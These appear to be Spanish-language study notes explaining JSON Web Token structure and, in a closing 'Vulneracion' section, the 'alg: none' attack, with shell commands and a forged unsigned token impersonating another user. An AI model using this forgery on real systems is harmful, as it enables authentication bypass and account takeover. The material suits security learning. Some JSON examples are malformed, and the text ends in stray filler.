https://jwt.io --> Decoder

---
_Estructura_: 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9. _eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ_.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

_eyJ_ --> Siempre empiezan por eyJ

---
Son 3 apartados separados por puntos:
_1ra seccion_ -> Header:

```js
{
  "alg": "HS256",
  "typ": "JWT"
}
```

`alg` = Algoritmo criptográfico de firma, no el método de codificación, por ejemplo:
- **HS256** → HMAC + SHA-256 (clave secreta compartida).
- **RS256** → RSA + SHA-256 (clave privada/pública).
- **ES256** → ECDSA + SHA-256.

`typ` = Tipo de token (normalmente JWT)

---
_2da seccion_ -> Payload: JSON con la data del usuario que se tramita codificada a base64

```json
{
  "name": "Juan",
  "last-name" : "Perez"
  "admin": true,
 }
```

---
_3ra seccion_ -> Firma digital, el servidor especifica una clave, y la **hashea** (junto con el _header_._payload_) con el algoritmo que se especifica en el header y a todo eso lo encodea a Base64. El **hash** es lo que la hace indecifrable:

```JWT
firma = Base64URL( HMAC_SHA256( clave_secreta, base64url(header) + "." + base64url(payload)))
```

---
---
---
### Vulneracion

En algunos casos, si el JWT esta muy mal configurado, te va a dejar manipular el header y cambiar la linea:

`"alg": "HS256",` por -> `  "alg": "NONE",`

No es necesario ponerle firma.

```bash
echo -n '{"alg":NONE,"typ":JWT}' | base64
echo -n '{"id":2,"username":"te-robe"}' | base64
```

`eyJhbGciOk5PTkUsInR5cCI6SldUfQ.eyJpZCI6MiwidXNlcm5hbWUiOiJ0ZS1yb2JlIn0` -> Asi quedaria la cookie, si esta mal configurada no pide firma.


SADASDASDADSA